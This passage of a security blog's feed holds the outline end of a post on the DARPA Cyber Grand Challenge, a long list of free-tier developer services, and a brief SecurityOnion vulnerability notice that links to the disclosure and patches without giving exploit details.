<p>•   How do we build capacity to deliver?</p>

<p>•   Which fundamentals need to be in place?</p>

<p>•   How much and which resources (human capital, compute, political) are
desired vs. needed?</p>

<p>•   Total Cost of Ownership?</p>

<p>•   Best value?  Or script kiddy?</p>

<p>Measuring is Hard</p>

<p>•   Beware</p>

<p>•   What is an effect?</p>

<p>•   Analytics</p>

<p>•   Intentional behaviors</p>

<p>•   Systems</p>

<p>•   Risk and the Unknown</p>

<p>•   Noise and deliberate behaviors</p>

<p>•   SIRA Book of Common Knowledge</p>

<p>•   Key performance indicators</p>

<p>◦                    General theories of performance</p>

<p>•   Analytics</p>

<p>◦                    Motivations and emulations</p>

<p>◦                    When is a challenge not a challenge?</p>

<p>◦                    Plans and concepts</p>

<p>◦                    Sensors and Effectors</p>

<p>◦                    Risk</p>

<p>•   Pragmatic Dogma</p>

<p>◦                    Classical problem solving</p>

<p>◦                    Different red team and cracking pedagogies</p>

<p>Compute</p>

<p>•   Ingredients</p>

<p>•   Experimentation</p>

<p>•   Hypothesis generation</p>

<p>•   Scientific method and experimentation</p>

<p>•   Search and Optimization</p>

<p>•   Blind vs. Knowledge optimizations</p>

<p>•   System vs. Negotiation optimizations</p>

<p>•   Emulations at small scale</p>

<p>•   Emulations at large scale</p>

<p>Results</p>

<p>•   Fidelity</p>

<p>•   Mining</p>

<p>•   Analysis</p>

<p>•   6V</p>

<p>•   Architecture and Storage</p>

<p>•   Real-time or close enough?</p>

<p>•   Common Information Modeling</p>

<p>•   Historical forms</p>

<p>•   Current forms</p>

<p>•   DARPA Cyber Grand Challenge forms</p>

<p>•   Genetic development forms</p>

<p>•   Advanced forms</p>

<p>I think therefore I am</p>

<p>•   Scenarios</p>

<p>•   Is it really a risk?  Residual risk? Vulnerability or foothold?</p>

<p>•   Possibilities and plausibilities</p>

<p>•   Modeling complex systems</p>

<p>•   Capability modeling</p>

<p>•   Strategies</p>

<p>•   Network, physical, and socio-economic models</p>

<p>Algorithms</p>

<p>•   Challengers</p>

<p>•   Simulators</p>

<p>•   Motivators</p>

<p>•   Emulations</p>

<p>•   Context enrichment and optimization</p>

<p>•   Response</p>

<p>•   Mining</p>

<p>•   Behavioral mining</p>

<p>•   Dealing with complexity</p>

<p>The Cyber Grand future</p>

<p>•   Future work</p>

<p>•   Where do we go?</p>

<p>•   Techniques and computational methodologies to be fleshed out</p>

<p>•   Applications</p>

<p>Please subscribe to this blog so you may be kept up to date as the posts roll
out.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cyber Grand Challenge"/>
    <category term="DARPA"/>
    <category term="Red Teaming"/>
    <category term="Automation"/>
    <category term="Cybersecurity"/>
    <category term="CTF"/>
    <category term="AI in Security"/>
    <category term="Game Theory"/>
    <category term="Big Data Security"/>
    <category term="Security Automation"/>
    <category term="Cloud Security"/>
    <category term="Adversarial Modeling"/>
    <category term="CTF Strategy"/>
    <category term="Security Research"/>
    <summary type="html"><![CDATA[This Thursday, seven research institutions will compete against each other. Unlike other typical hacker challenges, their automations will compete on their behalf. The winning team will take home]]></summary>
  </entry>
  <entry>
    <title type="html">Relatively Free</title>
    <link href="https://www.securesql.info/2016/03/22/freeish-services/" rel="alternate" type="text/html" title="Relatively Free"/>
    <published>2016-03-22T00:00:00-07:00</published>
    <updated>2016-03-22T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2016/03/22/freeish-services</id>
    <content type="html" xml:base="https://www.securesql.info/2016/03/22/freeish-services/"><![CDATA[<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>From my text library, this is list of software (SaaS, PaaS, IaaS, etc.) and other offerings which have a free service or tier.

The scope of this particular list is limited to things infrastructure developers (System Administrator, DevOps Practitioners, etc.) are likely to find useful. We love all the free services out there, but it would be good to keep it on topic.It's a bit of a grey line at times so this is a bit opinionated; do not be offended if I do not accept your contribution.


Table of Contents
=================

 * [Source Code Repos](#source-code-repos)
 * [Tools for teams &amp;amp; Collaboration](#tools-for-teams--collaboration)
 * [Code Quality](#code-quality)
 * [Code Search and Browsing](#code-search-and-browsing)
 * [CI / CD](#ci--cd)
 * [Security and PKI](#security-and-pki)
 * [Management Systems](#management-systems)
 * [Log Management](#log-management)
 * [Translation Management](#translation-management)
 * [Analytics](#analytics)
 * [Monitoring](#monitoring)
 * [Crash / Exception handling](#crash--exception-handling)
 * [Search](#search)
 * [Email](#email)
 * [CDN and Protection](#cdn-and-protection)
 * [PaaS](#paas)
 * [BaaS](#baas)
 * [Web Hosting](#web-hosting)
 * [IaaS](#iaas)
 * [DBaaS](#dbaas)
 * [STUN, WebRTC, Web Socket Servers and other Routers](#stun-webrtc-web-socket-servers-and-other-routers)
 * [Issue tracking / Project management](#issue-tracking--project-management)
 * [Storage and Media Processing](#storage-and-media-processing)
 * [Data Visualization on Maps](#data-visualization-on-maps)
 * [Package Build Systems](#package-build-systems)
 * [IDE and Code Editing](#ide-and-code-editing)
 * [Analytics, Events andStatistics](#analytics-events-and--statistics)
 * [International Mobile number verification API and SDK](#international-mobile-number-verification-api-and-sdk)
 * [Payment / Billing Integration](#payment--billing-integration)
 * [Other Packs](#other-packs)
 * [Docker Related](#docker-related)
 * [Alternate container hosting](#alternate-container-hosting)
 * [Vagrant Related](#vagrant-related)
 * [Vagrant box indexes](#vagrant-box-indexes)
 * [Data mining](#data-mining)


## Source Code Repos

* https://bitbucket.org/ - Unlimited public and private git repos for small teams
* http://chiselapp.com/ - Unlimited public and private Fossil repositories
* https://github.com - Free for an unlimited number of public repositories
* https://about.gitlab.com/ - Unlimited public and private git repos with unlimited collaborators
* https://hub.jazz.net/ - Unlimited public repos, private repos free for up to 3 accounts.
* https://visualstudio.com - Free unlimited private repos (Git and TFS) for up to 5 users per team
* https://assembla.com - Free repo hosting in a free plan.


## Tools for teams &amp; Collaboration

* http://appear.in/ - One click video conversations, for free
* http://www.hall.com/ - Free for unlimited users with some feature limitations
* https://www.flowdock.com/ - Chat and inbox, free for teams of 5 or less
* https://slack.com - Free for unlimited users with some feature limitations
* https://hipchat.com - Free for unlimited users with some feature limitations
* https://gitter.im - "Chat, for GitHub". Unlimited public &amp; private rooms, free for teams of up to 25
* http://www.google.com/hangouts/ - One place for all your Conversations, for free (Need Google Account)
* https://kato.im - Team Chat &amp; Collaboration, free for unlimited users with some feature limitations
* http://seafile.com/ - Private or cloud storage, file sharing, sync, discussions. Private version is full. Cloud version has just 1 GB.
* https://sameroom.io - Free for unlimited users with some feature limitations
* https://yammer.com/ - Private social network standalone or for MS Office 365. Free, just a bit less admin tools and users management features.
* https://www.blockspring.com/ - Share scripts with anyone on your team: cross language and with spreadsheet users. Free for 5 million runs a month.
* https://helpmonks.com/ - Shared inbox for teams - Free for open source projects and non-profit organizations.
* http://typetalk.in/ - Share and discuss ideas with your team through instant messaging on the web or on your mobile.


## Code Quality

* http://tachikoma.io - Dependency Update for Ruby, Node.js, Perl projects - free for Open Source
* https://landscape.io/ - Code Quality for Python projects, free for Open Source
* https://codeclimate.com/ - Automated code review, free for Open Source
* https://houndci.com/ - Comments on github commits about code quality - free for Open Source
* https://coveralls.io/ - Display test coverage reports - free for open source
* https://scrutinizer-ci.com/ - Continuous inspection platform - free for Open Source
* https://codecov.io/ - Code coverage tool (SaaS), free for 1 private project and no restrictions for publics repos
* https://insight.sensiolabs.com/ - Code Quality for PHP/Symfony projects, free for Open Source
* https://www.codacy.com/ - Automated code reviews for PHP, Python, Javascript, Scala and CSS - free for open source
* https://www.pullreview.com - Automated Code Review for Ruby in GitHub, Bitbucket and Gitlab - free for Open Source


## Code Search and Browsing
* https://sourcegraph.com/ - Java, Go, Python, Node.js, etc., code search/cross-references - free for open source
* https://searchcode.com/ - comprehensive text-based code search - free for open source


## CI / CD

* https://codeship.com/ - 100 private builds / month, 5 private projects.Unlimited for Open Source
* https://circleci.com - Free for one concurrent build
* https://travis-ci.org - Free for public Github repositories.
* http://wercker.com/ - Free for public and private repositories
* https://drone.io/ - CI platform that includes browser testing, free for Open Source
* https://semaphoreci.com/ - 100 private builds / month. Unlimited for Open Source.
* http://www.shippable.com/ - Free for 1 build container, private and public repos, unlimited builds.
* https://snap-ci.com - Free for public repositories, 1 build at the time
* http://www.appveyor.com/ - CD service for Windows. Free for open-source projects.
* [Comparison of Continuous Integration services](https://github.com/ligurio/Continuous-Integration-services)
* https://saucelabs.com/ - CI with scalable testing for mobile and web apps, free for Open Source
* http://ftploy.com/ - 1 project w/ unlimited deployments
* https://deployhq.com/ - 1 project w/ 10 daily deployments
* https://hub.jazz.net/ - 60 minutes of free build time / month.
* https://styleci.io/ - Public GitHub repositories only.


## Security and PKI

* http://vaddy.net - Continuous web security testing with continuous integration (CI) tools. 3 domains, 10 scan history for free
* https://www.globalsign.com/en/ssl/ssl-open-source/ - Free SSL certs for Open Source projects
* https://www.startssl.com/ - Free SSL certs
* https://stormpath.com/ - Free user management, authentication, social login, and SSO.
* https://auth0.com/ - Hosted free for development SSO
* https://getclef.com/ - New take on auth unlimited free tier for anyone not using premium features
* https://ringcaptcha.com/ - Tools to use phone number as id, available for free
* https://www.ssllabs.com/ssltest/ - Very deep analysis of the configuration of any SSL web server
* https://qualys.com/forms/freescan/owasp/ - Find web app vulnerabilities, audit for OWASP Risks
* [alienvault.com ThreatFinder](https://www.alienvault.com/open-threat-exchange/threatfinder) - Uncovers compromised systems in your network
* https://duosecurity.com - Two-factor authentication (2FA) for website or app. Free 10 users, all authentication methods, unlimited, integrations, hardware tokens.


## Management Systems

* https://opbeat.com/ - Release, deploy, monitor.Free for 3 users
* https://bitnami.com/ - Deploy prepared apps on IaaS. Management of 1 AWS micro instance free


## Log Management

* https://papertrailapp.com/ - 48 hours search, 7 day archive, 100MB/month
* https://logentries.com/ - Free up to 5GB/month with 7 day retention
* https://www.loggly.com/ - Free for a single user, see the ```lite``` option
* http://sematext.com/logsene - Free for 1M logs, unlimited retention
* https://www.sumologic.com - Free up to 500MB/day, 7 day retention


## Translation Management

 * https://lingohub.com - free up to 3 users, Open Source projects are always free
 * https://www.getlocalization.com/ - free for public projects
 * http://webtranslateit.com - free up to 500 strings
 * http://transifex.com - free for Open Source projects
 * http://www.oneskyapp.com/ - limited free edition for up to 5 users, free for Open Source projects
 * https://crowdin.com - Unlimited projects, unlimited strings and collaborators for Open Source projects


## Analytics

* http://www.splunk.com/en_us/products/splunk-cloud.html - Upload 5GB of data per day up to 28GB of total data stored
* https://parse.com - Unlimited free analytics
* https://keen.io - Up to 50,000 events/month free


## Monitoring

* http://www.appneta.com - Free with 1 hour data retention
* https://www.thousandeyes.com- Network &amp; user experience monitoring. 3 locations, plus 20 data feeds of major web services free.
* https://www.datadoghq.com/ - Free for up to 5 nodes
* http://www.stackdriver.com/ - Free for up to 10 nodes/services
* https://keymetrics.io/ - Free for 2 servers with 7 days data retention
* http://newrelic.com/ - Free with 24 hour data retention
* https://nodequery.com/ - Free basic server monitor up to 10 servers
* https://www.pingdom.com/free/ - 1 site free
* http://www.watchsumo.com/ - Free website uptime monitoring
* https://www.opsgenie.com/ - Alert management with mobile push. 600 free alerts for 2 users a month
* https://www.runscope.com/ - Monitor and log API usage.Single user 10,000 request/month free
* http://www.circonus.com/ - Free for 20 metrics
* https://uptimerobot.com/ - Website monitoring, 50 monitors free
* https://www.statuscake.com/ - Website monitoring, unlimited tests free with limitations
* http://www.boundary.com/ - Free 1 second resolution for up to 10 servers
* https://ghostinspector.com/ - Free website and web application monitoring. Single user, 100 test runs per month
* http://java-monitor.com/ - Free monitoring of JVM's and uptime
* http://sematext.com/spm - Free for 24h metrics, unlimited number of servers, 10 custom metrics, 500K custom metrics data points, unlimited dashboards, users, etc.
* https://sealion.com/ - Free up to 2 servers, 3 days data retention, graphs and raw command output history (`top`, `ps`, `ifconfig`, `netstat`, `iostat`, `free`, custom, etc.)
* https://www.stathat.com - Get started with ten stats for free, no expiration.
* https://www.skylight.io - Free for first 100k requests
* https://www.appdynamics.com - Free for 24h metrics, application performance management agents limited to one Java, one .NET, one PHP, and one Node.js
* https://deadmanssnitch.com - Monitoring for cron jobs. 1 free snitch (monitor) - more available if you refer others to sign up


## Crash / Exception handling

* https://rollbar.com/ - Exception and error monitoring, free plan - 5000 errors/month, unlimited users, 30 days retention.
* https://bugsnag.com/ - Free for up to 2000 errors a month after the initial trial
* https://airbrake.io/ - Free for 1 project, 1 user, 2 errors per minute, 2 day retention
* http://getsentry.com/ - Sentry tracks app exceptions in realtime, has a small free plan. Free, unrestricted use if self-hosted.


## Search

* https://www.algolia.com - Hosted search-as-you-type (instant). Free hacker plan up to 1,000 documents and 50,000 operations. Bigger free plans available for community/open source projects.
* https://swiftype.com - hosted search solution (API and crawler). Free for a single search engine with up to 1000 documents. Free upgrade to Premium level for open-source projects.
* https://bonsai.io - Free 1GB memory and 1GB storage.
* http://www.searchly.com - Free 2 Indices and 5MB storage.


## Email

* http://www.sparkpost.com/ - First 10,000 emails per month are free
* http://www.mailgun.com/ - First 10,000 emails per month are free
* http://mailchimp.com/ - 2,000 subscribers and 12,000 emails per month are free
* https://sendloop.com/ - 2,000 subscribers and 10,000 email delivery every month is free
* http://sendgrid.com/ - 400 emails per day for free/25,000 free transactional emails per month for emails sent from a Google compute instance
* http://mandrill.com/ - First 12,000 emails per month are free
* https://www.phplist.com/ - Hosted version allow 300 mails per month for free
* https://www.mailjet.com/ - 6000 mails per month for free
* https://www.sendinblue.com/ - 9000 mails per month for free
* https://mailtrap.io - fake SMTP server for development, free plan with 1 inbox, 50 messages, no team members, 2 emails/sec, no forward rules
* https://mailstache.io - 4 Mailboxes @ 1GB each for up to 2 custom domains.
* https://postmarkapp.com - First 25,000 emails are free
* https://www.zoho.com/mail/ - Free Email management and collaboration for up to 10 users.
* http://moosend.com/ — Mailing list management service. Free account for 6 months for startups.


## CDN and Protection

* http://www.cloudflare.com/ - Basic service is free, good for a blog
* http://www.bootstrapcdn.com/ - CDN for bootstrap, bootswatch and font awesome
* https://surge.sh - Zero-bullshit, single–command, bring your own source control web publishing CDN.
* https://cdnjs.com/ - CDN for JavaScript libraries, CSS libraries, SWF, images, etc!
* http://www.jsdelivr.com/ - super-fast CDN of OSS (JS, CSS, fonts) for developers and webmasters, accepts PRs to add more
* https://developers.google.com/speed/libraries/ - The Google Hosted Libraries is a content distribution network for the most popular, open-source JavaScript libraries.
* https://www.asp.net/ajax/cdn - The Microsoft Ajax Content Delivery Network (CDN) hosts popular third party JavaScript libraries such as jQuery and enables you to easily add them to your Web application
* https://toranproxy.com/ - Proxy for Packagist and GitHub. Never fail CD. Free for personal use, 1 developer, no support.
* http://rawgit.com - free limited traffic, serves raw files directly from GitHub with proper Content-Type headers.


## PaaS

* https://cloud.google.com/appengine/ - Google App Engine gives 28 instance hours free, 1Gb NoSQL Database and more.
* https://www.engineyard.com - Engine Yard provides 500 free hours
* http://azure.microsoft.com/ - MS Azure gives $200 worth of free usage for a trial
* http://hpcloud.com/ - $300 credit over 90 days.
* https://appharbor.com/ - A .Net PaaS that provides 1 free worker
* https://shellycloud.com/ - Platform for hosting Ruby and Ruby on Rails apps. Shelly Cloud gives €20 free credit
* https://www.heroku.com/ - Host your apps in the cloud, free for single process apps
* https://www.firebase.com/ - Build realtime apps, free plan has 50 Max Connections, 5 GB Data Transfer, 100 MB Data Storage. 1 GB Hosting Storage and 100 GB Hosting Transfer.
* https://bluemix.net/ - IBM PaaS with a monthly free allowance
* https://www.openshift.com/ - Red Hat PaaS, free tier provides three small gears (each with 512MB memory, 1GB storage). {[Browse one-click deployments](https://hub.openshift.com/)}.
* https://scalingo.com - Free Tier, up to 3 apps, 1 container each, combined with data store addons free tier
* https://algorithmia.com - Host algorithms for free - includes 10,000 credits (seconds of on-demand execution time) free
* https://bigml.com/ - Hosted machine learning algorithms. Unlimited free tasks for development, limit of 16MB data per task
* https://www.activestate.com/stackato/ - Enterprise-hardened Cloud Foundry PaaS from ActiveState, for private, public and hybrid cloud, free up to 20GB
* http://www.outsystems.com/ - Enterprise web development PaaS for on-premise or cloud, free "personal environment" offering allows for unlimited code and up to 1GB database.
* https://platform.telerik.com/ - Build and deploy mobile applications using Javascript. Free plan has 100 MB Data Storage, 1GB File storage, 5GB Bandwidth, 1 million push notifications for BaaS offering, 100 active devices for analytics.
* http://scn.sap.com/docs/DOC-56411 - The in-memory Platform-as-a-Service offering from SAP. Free developer accounts come with 1GB structured, 1GB unstructured, 1GB of Git data and allow you to run HTML5, Java and HANA XS apps.
* https://www.mendix.com/ - Rapid Application Development for Enterprises - Unlimited number of free sandbox environments supporting 10 users, 100MB of files and 100MB database storage each.


## BaaS

* http://apigee.com/docs/api-baas (product docs), http://apigee.com/docs/developer-vs-edge (registration) - Unlimited trial includes NoSQL data store with 25GB of storage, user and permission management, geolocation, 10,000,000 push notifications per month, remote configuration, beta and A/B split testing, APM, fully API driven.Accessible and manageable via UI, SDK, and API.
* http://appacitive.com/ - Mobile backend, free for the first 3 months with 100k API calls,Push notifications.
* https://bip.io/ - A web-automation platform for easily connecting web services. Fully open GPLv3 to power the backend of your open-source project.Commercial OEM License available.
* https://www.blockspring.com/ - Cloud functions. Free for 5 million runs a month.
* https://www.contentful.com - Content as a Service. Content Management &amp; Delivery APIs in the cloud. 3 users, 3 spaces (repositories) and 1,000,000 API requests per month for free.
* http://www.kinvey.com - Mobile backend, starter plan has unlimited requests per second, with 2 GB of data storage, as well as push notifications for up 5,000,000 unique recipients. Enterprise application support.
* http://konacloud.io Web and Mobile Backend as a Service, with 5 GB free account.
* https://layer.com/ - The full-stack building block for communications.
* https://www.parse.com - Mobile backends, free plan has 30 requests per second, with 20 GB of file and database storage, as well as push notifications for up to 1,000,000 unique recipients.
* http://quickblox.com/ - A communication backend for instant messaging, video and voice calling, and push notifications


## Web Hosting

* https://www.simplybuilt.com - SimplyBuilt offers free website building and hosting for open source projects (http://www.simplybuilt.com/explore/free-websites-for-open-source-projects). Simple alternative to GitHub Pages.
* http://www.devport.co - Turn GitHub projects, Apps, and websites into a personal developer portfolio.
* https://www.netlify.com - Builds, deploy and hosts static site or app, free for 100 MB data and 1 GB bandwidth.
* https://divshot.com/ - Static Web Hosting for Developers, free basic apps, 1 GB bandwidth, 100 MB storage, custom domains, subdomain SSL.


## IaaS

* http://aws.amazon.com/free/ - AWS Free Tier - Free for 12 months
* https://exoscale.ch/ - Free resources for Open Source projects
* https://developer.rackspace.com/ - Rackspace Cloud gives $50/month for 12 months
* https://cloud.google.com/compute/ - Google Compute Engine gives $300 over 60 days
* https://cloud.google.com/container-engine/ - Google Container Engine for run Docker containers(Alpha). Pricing: same of Google Compute Engine.
* https://nsone.net/ - Data Driven DNS, automatic traffic management, 1M free Queries
* https://developer.rackspace.com/signup/ - Get $50/month for 12 months to use toward cloud services.


## DBaaS

 * https://mongolab.com/ - MongoDB as a service (500mb free)
 * https://cloudant.com/ - Hosted database from IBM, free if usage is below $50/month
 * https://realm.io - Free to use even for commercial projects, under Apache 2.0 License
 * https://orchestrate.io/ - 1 application free
 * https://redislabs.com/redis-cloud - Redis as a Service (25 mb free)
 * https://www.backand.com/ - Back-end as a service (for AngularJS)
 * http://www.zenginehq.com - Build business workflow apps in minutes - free for single users
 * https://parsehub.com/ — Extract data from dynamic sites, turn dynamic websites into APIs, 5 projects free.
 * https://import.io/ - Easily turn websites into APIs, completely free for life.
 * https://kimonolabs.com - "Turn websites into structured APIs from your browser in seconds", free for public APIs, up to 20 million pages fetch / month. Supports scheduling, JSON, CSV, post-auth, ...
 * https://redsmin.com/ - Online real-time monitoring and administration service for Redis, 1 Redis instance free
 * http://graphstory.com/ - GraphStory offers Neo4j (a Graph Database) as a service
 * http://www.elephantsql.com/ - PostgreSQL as a service (20mb free)


## STUN, WebRTC, Web Socket Servers and other Routers

 * https://pusher.com. Hosted Web Sockets broker. Free for up to 20 simultaneous connections and 100k messages a day.
 * stun:stun.l.google.com:19302 - Google STUN
 * stun:global.stun.twilio.com:3478?transport=udp - Twilio STUN
 * https://www.segment.com. Hub to translate and route events to other third party services. 100k events a month free.
 * https://ngrok.com/ - expose locally running servers over a tunnel to a public URL


## Issue tracking / Project management

 * https://www.pivotaltracker.com/community/public-projects - Pivotal Tracker. Free for public projects.
 * https://www.atlassian.com/opensource/overview - Free Jira etc for Open Source projects
 * https://kanbanflow.com/ - Board based project management. Free (premium version with more options).
 * https://kanbanpad.com/ - Board based project management. Free (premium version with more options).
 * https://kanbanery.com/ - Board based project management. Free for 2 users (premium tiers with more options).
 * https://zenhub.io/ - The only project management solution inside GitHub. Free for public repos, OSS, and non-profits.
 * https://trello.com/ - Board based project management. Free
 * https://waffle.io/ - Board based project management solution from your existing GitHub Issues. Free for open-source.
 * https://huboard.com/ - Instant project management for your GitHub issues. Free for open-source.
 * https://taiga.io/ - Project management platform for startups and agile developers. Free for open-source.
 * https://www.jetbrains.com/youtrack/buy/open_source_incloud.jsp - Free hosted YouTrack (InCloud) for FOSS projects (private projects free for 10 users: https://www.jetbrains.com/youtrack/buy/)
 * https://github.com - In addition to its git storage facility, github offers basic issue tracking
 * https://asana.com - Free for private project with collaborators.
 * http://www.acunote.com/ - Free project management and SCRUM software for up to 5 team members.
 * http://gliffy.com/ - Online diagrams: flowchart, UML, wireframe... Also Plugins for Jira &amp; Confluence. 5 diagrams and 2 MB free.
 * https://cacoo.com/ - Online diagrams in real time: flowchart, UML, network. Free max. 15 users/diagram, 25 sheets.
 * https://www.draw.io/ - Online diagrams stored locally, in Google Drive, OneDrive or Dropbox. Free for all features and storage levels.
 * https://hub.jazz.net/ - IBM Bluemix's project management services. Free for public projects, free for up to 3 users for private projects.
 * http://leankit.com/ - Kanban board, that visualizes your workflow. Free up to 10 users.
 * https://www.visualstudio.com/products/what-is-visual-studio-online-vs - Unlimited free private code repositories; Tracks bugs, work items, feedback and more.
 * https://testlio.com - Issue tracking, test management and beta testing platform. Free for private use.


## Storage and Media Processing

 * https://www.aerofs.com/ - P2P file syncing, free for up to 30 users
 * http://cloudinary.com - Image upload, powerful manipulations, storage, and delivery for sites and apps, with libraries for Ruby, Python, Java, PHP, Objective-C and more. Perpetual free tier includes 7500 images/month, 2gb storage, 5gb bandwidth.
 * https://plot.ly - graph and share your data. Free tier includes unlimited public files and 10 private files.
 * https://transloadit.com - Handles file uploads &amp; encoding of video, audio, images, documents. Free for open source &amp; other do-gooders. Commercial applications get the first GB free for test driving.
 * https://podio.com/ - You can use Podio with a team of up to five people and try out the features of the Basic Plan - except User Management.
 * https://shrinkray.io - free image optimization of Github repos
 * https://www.cine.io - Scalable video broadcasting and p2p real-time video chat for iOS, Android, and web. Free tiers available for developers.


## Data Visualization on Maps

 * http://geocod.io - Geocoding via API or CSV Upload. 2.500 free queries per day.
 * http://gogeo.io/ - Maps and geospatial services with an easy to use API and support for big data
 * https://cartodb.com - Create maps and geospatial APIs from your data and public data.
 * http://www.giscloud.com - Visualize, analyze and share geo data online.
 * https://www.mapbox.com/ - Maps, geospatial services, and SDKs for displaying map data.


## Package Build Systems

 * https://build.opensuse.org/ - package build service for multiple distros (SUSE, EL, Fedora, Debian etc.)
 * https://copr.fedoraproject.org/ - mock-based RPM build service for Fedora and EL
 * https://help.launchpad.net/Packaging - Ubuntu and Debian build service


## IDE and Code Editing

 * https://c9.io - IDE in a browser. Incorporates an Ubuntu virtual machine and in-browser terminal access. Integrates with github and bitbucket, but also adds SFTP and generic Git access.
 * https://koding.com - IDE in a browser. Features: Full sudo access - VMs hosted on Amazon EC2 - SSH Access - Real EC2 VM, no LXCs/hypervising - Custom sub-domains - Publicly accessible IP - Ubuntu 14.04 - IDE/Terminal/Collaboration
 * https://www.nitrous.io - Private Linux instance(s) with interactive collaboration {[More Details](http://goo.gl/J1Zbsg)}
 * http://visualstudio.com/free - Fully-featured IDE with thousands of extensions, cross-platform app development (Microsoft extensions available for download for iOS and Android), desktop, web and cloud development, multi-language support (C#, C++, JavaScript, Python, PHP and more).
 * https://cloud.sagemath.com - Collaborative mathematics-oriented IDE in a browser, with support for Python, LaTeX, IPython Notebooks, etc.
 * https://wakatime.com - quantified self metrics about your coding activity, using text editor plugins - Limited plan for free.
 * https://codenvy.com/ - IDE in a browser, collaborative, git integration, build and run your app in customizable Docker-based runners (free 512Mb RAM to distribute between you runners), pre-integrated deploy to Google Apps.
 * https://apiary.io/ - Collaborative design API with instant API mock and generated documentation (Free for unlimited API blueprints and unlimited user with one admin account and hosted documentation)
 * https://www.mockable.io/ - Mockable is a simple configurable service to mock out RESTful API or SOAP web-services. This online service allows you to quickly define REST API or SOAP endpoints and have them return JSON or XML data.
 * https://www.jetbrains.com/products.html - Productivity tools, IDEs and deploy tools. Free license for students, teachers, open source projects, and user groups.
 * https://readme.io/ - Beautiful documentations made easy - free for Open Source
 * https://www.visualstudio.com/en-us/products/visual-studio-community-vs.aspx - Visual Studio. Not only for Windows and .NET
 * https://codio.com/ - Codio is a cloud-based computer programming platform for universities, schools, and developer professionals.
 * http://www.stackhive.com/ - Cloud based IDE in browser that supports HTML5/CSS3/jQuery/Bootstrap
 * http://www.tadpoledb.com/ - IDE in browser Database tool. Support Amazon RDS, Apache Hive, Apache Tajo, CUBRID, MariaDB, MySQL, Oracle, SQLite, MSSQL, PostgreSQL and MongoDB databases.


## Analytics, Events andStatistics

 * https://www.librato.com/ - Event/Data collection service with analysis and graphs. Limited plan for free.
 * https://google.com/analytics/ - Google Analytics
 * https://heapanalytics.com/ - Automatically captures every user action in iOS or web apps. Free for up to 5,000 visits per month.
 * http://sematext.com/search-analytics - Free for up to 50K actions/month, 1 day data retention, unlimited dashboards, users, etc.
 * https://usabilityhub.com - Test designs and mockups on real people, track visitors. Free for one user, unlimited tests.
 * https://gosquared.com - Track up to 1,000 data points for free.
 * https://mixpanel.com - Free 25000 points or 200000 with their badge on your site.



## International Mobile number verification API and SDK
 * https://www.cognalys.com - Freemium mobile number verification through an innovative and reliable method than using SMS gateway. Free accounts will have 70 Tries and 50 verifications per day. {[Signup](https://www.cognalys.com/signup/1)}


## Payment / Billing Integration

 * https://www.braintreepayments.com - Credit Card, Paypal, Venmo, Bitcoin, Apple Pay (, ...) integration. Single and Recurrent Payments. First $50 are free of charge.


## Other Packs

 * https://education.github.com/pack - As long as you're a student at a recognized university


## Docker Related
### Alternate container hosting

* https://quay.io/ - Unlimited free public containers


## Vagrant Related
### Vagrant box indexes

* https://atlas.hashicorp.com/boxes/search - HashiCorp's index of boxes
* http://vagrantbox.es - An alternative public box index


## Data mining
* http://www.monkeylearn.com/ - Text mining in the cloud, 1,000 queries for free per month.
</code></pre></div></div>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Free Resources"/>
    <category term="DevOps"/>
    <category term="SaaS"/>
    <category term="PaaS"/>
    <category term="IaaS"/>
    <category term="Cloud Services"/>
    <category term="Tools for Developers"/>
    <category term="Infrastructure"/>
    <category term="Automation"/>
    <category term="Open Source"/>
    <summary type="html"><![CDATA[From my text library, this is list of software]]></summary>
  </entry>
  <entry>
    <title type="html">Multiple vulnerabilities in SecurityOnion</title>
    <link href="https://www.securesql.info/2016/03/22/securityonion-vunlerabilities/" rel="alternate" type="text/html" title="Multiple vulnerabilities in SecurityOnion"/>
    <published>2016-03-22T00:00:00-07:00</published>
    <updated>2016-03-22T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2016/03/22/securityonion-vunlerabilities</id>
    <content type="html" xml:base="https://www.securesql.info/2016/03/22/securityonion-vunlerabilities/"><![CDATA[<p>Let this be a reminder of the joys in programming PHP</p>

<p><img src="https://securesql.info/images/image-
asset.jpeg" alt="" /></p>

<p>I have started to take a look at a number of security silver bullets.  The
first on my list - SecurityOnion.</p>

<p>Fortunately, glossing over the source, the search didn’t take longer than 3
minutes to find a few web vulnerabilities.   The poor programming practice was
an inherent trust in the malicious browser to do no harm.</p>

<p>I will leave the exercise of finding the RCE 0days to the reader.  There exist
3 web and 11 network traffic based vectors to enact arbitrary remote code
execution.</p>

<p>Disclosure may be found @</p>

<p>http://blog.securityonion.net/2016/02/securityonion-capme-20121213_10.html</p>

<p>Patches may be found @</p>

<p><a href="https://github.com/Security-Onion-Solutions/securityonion-capme/issues/1">https://github.com/Security-Onion-Solutions/securityonion-capme/issues/1</a><br />
<a href="https://github.com/Security-Onion-Solutions/securityonion-capme/issues/2">https://github.com/Security-Onion-Solutions/securityonion-capme/issues/2</a><br />
<a href="https://github.com/Security-Onion-Solutions/securityonion-capme/issues/3">https://github.com/Security-Onion-Solutions/securityonion-capme/issues/3</a><br />
<a href="https://github.com/Security-Onion-Solutions/securityonion-capme/issues/4">https://github.com/Security-Onion-Solutions/securityonion-capme/issues/4</a><br />
<a href="https://github.com/Security-Onion-Solutions/securityonion-capme/issues/5">https://github.com/Security-Onion-Solutions/securityonion-capme/issues/5</a><br />
<a href="https://github.com/Security-Onion-Solutions/securityonion-capme/issues/6">https://github.com/Security-Onion-Solutions/securityonion-capme/issues/6</a><br />
<a href="https://github.com/Security-Onion-Solutions/securityonion-capme/issues/7">https://github.com/Security-Onion-Solutions/securityonion-capme/issues/7</a><br />
<a href="https://github.com/Security-Onion-Solutions/securityonion-capme/issues/8">https://github.com/Security-Onion-Solutions/securityonion-capme/issues/8</a><br />
<a href="https://github.com/Security-Onion-Solutions/securityonion-capme/issues/9">https://github.com/Security-Onion-Solutions/securityonion-capme/issues/9</a><br />
<a href="https://github.com/Security-Onion-Solutions/securityonion-capme/issues/10">https://github.com/Security-Onion-Solutions/securityonion-capme/issues/10</a></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="SecurityOnion"/>
    <category term="Vulnerabilities"/>
    <category term="PHP Security"/>
    <category term="Remote Code Execution"/>
    <category term="Web Security"/>
